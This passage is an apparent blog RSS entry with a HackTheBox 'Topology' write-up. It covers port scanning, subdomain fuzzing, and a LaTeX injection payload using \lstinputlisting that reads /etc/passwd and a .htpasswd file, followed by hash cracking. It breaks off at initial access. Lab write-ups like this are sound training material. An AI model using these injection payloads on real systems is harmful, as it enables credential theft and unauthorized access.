<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>HTB on ybenel</title>
    <link>https://ybenel.cf/categories/htb/</link>
    <description>ybenel (HTB)</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Fri, 16 Jun 2023 00:00:00 +0000</lastBuildDate>
    
    <atom:link href="https://ybenel.cf/categories/htb/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>HTB - Topology</title>
      <link>https://ybenel.cf/post/htb_topology/</link>
      <pubDate>Fri, 16 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://ybenel.cf/post/htb_topology/</guid>
      <description>&lt;p&gt;Topology is an easy box that starts off by finding a local file discloser vulnerability,
In a LaTeX template, which allows us to get gain access by obtaining a password file with an encrypted password
that&amp;rsquo;s reused by a user on the box.
For ROOT there&amp;rsquo;s a setuid binary which we simply use to obtain root privileges.&lt;/p&gt;
&lt;h2 id=&#34;slim-to-none&#34; &gt;Slim To None
&lt;span&gt;
    &lt;a href=&#34;#slim-to-none&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;h3 id=&#34;user-enumeration&#34; &gt;User Enumeration
&lt;span&gt;
    &lt;a href=&#34;#user-enumeration&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;h4 id=&#34;open-ports&#34; &gt;Open Ports
&lt;span&gt;
    &lt;a href=&#34;#open-ports&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;As usual with most boxes only 2 ports open.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;80 HTTP (Apache)&lt;/li&gt;
&lt;li&gt;22 SSH (OpenSSH)&lt;/li&gt;
&lt;/ul&gt;
&lt;!--listend--&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic&#34;&gt;#Nmap 7.93 scan initiated Fri Jun 16 21:37:29 2023 as: nmap -p- --min-rate=10000 -sCV -oN scans/full-scan.nmap -vvv 10.10.11.217
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic&#34;&gt;&lt;/span&gt;Nmap scan report &lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;10.10.11.217&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host is up, received syn-ack (&lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;0.15&lt;/span&gt;s latency).
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Scanned at &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;2023&lt;/span&gt;-&lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;06&lt;/span&gt;-&lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;16&lt;/span&gt; &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;21&lt;/span&gt;:&lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;37&lt;/span&gt;:&lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;30&lt;/span&gt; UTC &lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;87&lt;/span&gt;s
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Not shown: &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;38893&lt;/span&gt; closed tcp ports (conn-refused), &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;26640&lt;/span&gt; filtered tcp ports (no-response)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PORT   STATE SERVICE REASON  VERSION
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;22&lt;/span&gt;/tcp open  ssh     syn-ack OpenSSH &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;8.2&lt;/span&gt;p1 Ubuntu &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;4u&lt;/span&gt;buntu0&lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;.7&lt;/span&gt; (Ubuntu Linux; protocol &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;2.0&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| ssh-hostkey:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|   &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;3072&lt;/span&gt; dcbc3286e8e8457810bc2b5dbf0f55c6 (RSA)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC65qOGPSRC7ko+...[snip]...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|   &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;256&lt;/span&gt; d9f339692c6c27f1a92d506ca79f1c33 (ECDSA)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdH..[snip].&lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;.8&lt;/span&gt;R28Y4CDP7h0h9vnlLWo=
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|   &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;256&lt;/span&gt; &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;4&lt;/span&gt;ca65075d0934f9c4a1b890a7a2708d7 (ED25519)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOaM68hPSVQXNWZbTV88LsN41odqyoxxgwKEb1SOPm5k
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;80&lt;/span&gt;/tcp open  http    syn-ack Apache httpd &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;2.4.41&lt;/span&gt; ((Ubuntu))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| http-methods:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_  Supported Methods: OPTIONS HEAD GET POST
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-server-header: Apache/&lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;2.4.41&lt;/span&gt; (Ubuntu)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-title: Miskatonic University | Topology Group
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;initial-enum&#34; &gt;Initial Enum
&lt;span&gt;
    &lt;a href=&#34;#initial-enum&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;Checking the http site, we just get a static site with a bunch &lt;strong&gt;users&lt;/strong&gt; and an &lt;strong&gt;email&lt;/strong&gt; and a list of &lt;strong&gt;projects&lt;/strong&gt;.
&lt;figure&gt;&lt;img src=&#34;https://ybenel.cf/imgs/topology/topology_webpage.png&#34;/&gt;&lt;figcaption&gt;
            &lt;h4&gt;Default Web Page&lt;/h4&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Lilian Klein (lklein@topology.htb)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Vajramani Daisley
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Derek Abrahams
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The interesting one is the &lt;strong&gt;LaTeX Equation Generator&lt;/strong&gt; which is pointing to &lt;a href=&#34;http://latex.topology.htb&#34;&gt;http://latex.topology.htb&lt;/a&gt;.&lt;/p&gt;
&lt;!--list-separator--&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Vhost discovery.&lt;/p&gt;
&lt;p&gt;We also will look for any other subdomains that might be hidden. Like our other projects or something better.
For that we&amp;rsquo;ll use &lt;strong&gt;Ffuf&lt;/strong&gt;.&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;https://ybenel.cf/imgs/topology/topology_vhost.png&#34;/&gt;&lt;figcaption&gt;
                &lt;h4&gt;FUZZ With FFUF&lt;/h4&gt;
            &lt;/figcaption&gt;
    &lt;/figure&gt;

&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;interesting-discoveries&#34; &gt;Interesting Discoveries
&lt;span&gt;
    &lt;a href=&#34;#interesting-discoveries&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;&lt;a href=&#34;http://stats.topology.htb&#34;&gt;http://stats.topology.htb&lt;/a&gt; which is just a static webpage with jpg images.
&lt;a href=&#34;http://dev.topology.htb&#34;&gt;http://dev.topology.htb&lt;/a&gt; requires &lt;strong&gt;credentials&lt;/strong&gt; in order to access it.&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;https://ybenel.cf/imgs/topology/topology_dev.png&#34;/&gt;&lt;figcaption&gt;
            &lt;h4&gt;(Dev Sub) Require AUTH&lt;/h4&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;&lt;a href=&#34;http://latex.topology.htb&#34;&gt;http://latex.topology.htb&lt;/a&gt; is an open directory listing which has couple files.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ybenel.cf/imgs/topology/topology_latex_dir.png&#34;/&gt;&lt;figcaption&gt;
            &lt;h4&gt;Listing Directory&lt;/h4&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

The interesting one is &lt;code&gt;equation.php&lt;/code&gt; which allows us to run latex commands and it compiles it then convert it into a png.
&lt;figure&gt;&lt;img src=&#34;https://ybenel.cf/imgs/topology/topology_gen.png&#34;/&gt;&lt;figcaption&gt;
            &lt;h4&gt;TEX Input Prompt&lt;/h4&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;figure&gt;&lt;img src=&#34;https://ybenel.cf/imgs/topology/topology_gen_out.png&#34;/&gt;&lt;figcaption&gt;
            &lt;h4&gt;Generated Image&lt;/h4&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
&lt;/p&gt;
&lt;h4 id=&#34;vulnerabilities-and-exploitation&#34; &gt;Vulnerabilities And Exploitation
&lt;span&gt;
    &lt;a href=&#34;#vulnerabilities-and-exploitation&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;Before we get into the file discloser vulnerability, let&amp;rsquo;s take a step further explaining what LaTeX is.
LaTeX is a typesetting system to create documents, meaning there&amp;rsquo;s not much we can do except for reading
local TeX files.
In LaTeX there&amp;rsquo;s quite few Engines like, LuaLaTex, pdflatex, XeTex, Tex, Latex, LaTeX2e..
there&amp;rsquo;s couple commands we can use to read a file.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\input&lt;/span&gt;{}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\include&lt;/span&gt;{}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\includeonly&lt;/span&gt;{}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\usepackage&lt;/span&gt;{}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;However if we tried any of these commands, we&amp;rsquo;ll instead get an illegal command output,
So we can verify there&amp;rsquo;s some sort of input validation checking, that will try to protect it.
&lt;figure&gt;&lt;img src=&#34;https://ybenel.cf/imgs/topology/topology_illegal.png&#34;/&gt;&lt;figcaption&gt;
            &lt;h4&gt;Input Filtration&lt;/h4&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Except&lt;/em&gt; in the directory listing we see couple TeX files presented, so there might be a package used that
has the ability to read files.
Check &lt;code&gt;header.tex&lt;/code&gt; we can see the following packages used.
&lt;figure&gt;&lt;img src=&#34;https://ybenel.cf/imgs/topology/topology_header.png&#34;/&gt;&lt;figcaption&gt;
            &lt;h4&gt;Preamble Header&lt;/h4&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

One that grabbed my attention was &lt;strong&gt;listings&lt;/strong&gt; which a package support typeset source code,
Mainly used for syntax highlighting, numbering and listings.
If you used LaTeX before and listings package you might be familiar with &lt;code class=&#34;code-inline language-latex&#34;&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\lsinputlisting&lt;/span&gt;&lt;/code&gt; which able to read a file.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\lsinputlisting&lt;/span&gt;&lt;span style=&#34;color:#ff0086;font-weight:bold&#34;&gt;[Language=Python]&lt;/span&gt;{myexample.py}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#080;background-color:#0f140f;font-style:italic&#34;&gt;%% OR Without the setting options.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#080;background-color:#0f140f;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\lsinputlisting&lt;/span&gt;{myexample.py}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So let&amp;rsquo;s try it.
&lt;figure&gt;&lt;img src=&#34;https://ybenel.cf/imgs/topology/topology_lsinput_error.png&#34;/&gt;&lt;figcaption&gt;
            &lt;h4&gt;LaTeX Errors&lt;/h4&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

Hmm, it wasn&amp;rsquo;t able to successfully output an image.
My first thoughts is that something is wrong with
the back-end code that&amp;rsquo;s not handling LaTeX correctly like not escape backslash and its very
common, when you create a preamble in &lt;em&gt;elisp&lt;/em&gt; or in this case &lt;em&gt;php&lt;/em&gt;
So i&amp;rsquo;ve tried &lt;code class=&#34;code-inline language-latex&#34;&gt; &lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\\\lsinputlisting&lt;/span&gt;{/etc/passwd}&lt;/code&gt; and it still didn&amp;rsquo;t work.
Then i remembered that from the web page this note.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;LaTeX inline math mode syntax in the text field (only oneliners supported at the moment).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Of cource one-liners do use dollar signs that&amp;rsquo;s way it didn&amp;rsquo;t work correctly.
In the backend its something like this.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a&#34;&gt;$texfile&lt;/span&gt;=&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34; &lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;document{article}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;usepackage{listings}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;usepacakge{amsmath}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;usepackage{charter}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;begin{document}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#39;$&amp;#39; . &lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;$textinput&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt; . &amp;#39;$&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;end{document} &amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;in everything between &lt;code&gt;$MATHHERE$&lt;/code&gt; is considered a math equation.
So let&amp;rsquo;s escape it.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\frac&lt;/span&gt;{1}{n^2}&lt;span style=&#34;color:#0086d2&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#fb660a&#34;&gt;\lstinputlisting&lt;/span&gt;{/etc/passwd}&lt;span style=&#34;color:#0086d2&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\frac&lt;/span&gt;{1}{n*2}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;and voila!
&lt;img src=&#34;https://ybenel.cf/imgs/topology/topology_filediscloser.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;!--list-separator--&gt;
&lt;h5 id=&#34;obtaining-access&#34; &gt;Obtaining Access.
&lt;span&gt;
    &lt;a href=&#34;#obtaining-access&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h5&gt;&lt;p&gt;I wasn&amp;rsquo;t able to read user&amp;rsquo;s ssh key, but since &lt;strong&gt;dev&lt;/strong&gt; subdomain is auth protected.
We can use our file discoloser vulnerability to obtain the password.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;http://latex.topology.htb/equation.php?eqn=&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\frac&lt;/span&gt;{1}{n^2}&lt;span style=&#34;color:#0086d2&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#fb660a&#34;&gt;\lstinputlisting&lt;/span&gt;{/var/www/dev/.htpasswd}&lt;span style=&#34;color:#0086d2&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\frac&lt;/span&gt;{1}{n*2}&amp;amp;submit=
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now Let&amp;rsquo;s convert our image to text.
&lt;figure&gt;&lt;img src=&#34;https://ybenel.cf/imgs/topology/toplogy_imageToText.png&#34;/&gt;&lt;figcaption&gt;
            &lt;h4&gt;Converting Image To Text&lt;/h4&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

And finally let&amp;rsquo;s crack it with hashcat.
&lt;figure&gt;&lt;img src=&#34;https://ybenel.cf/imgs/topology/topology_passwordcrack.png&#34;/&gt;&lt;figcaption&gt;
            &lt;h4&gt;Cracking With Hashcat&lt;/h4&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
&lt;/p&gt;
&lt;h4 id=&#34;initial-access-dot&#34; &gt;Initial Access.
&lt;span&gt;
    &lt;a href=&#34;#initial-access-dot&#34;&gt;
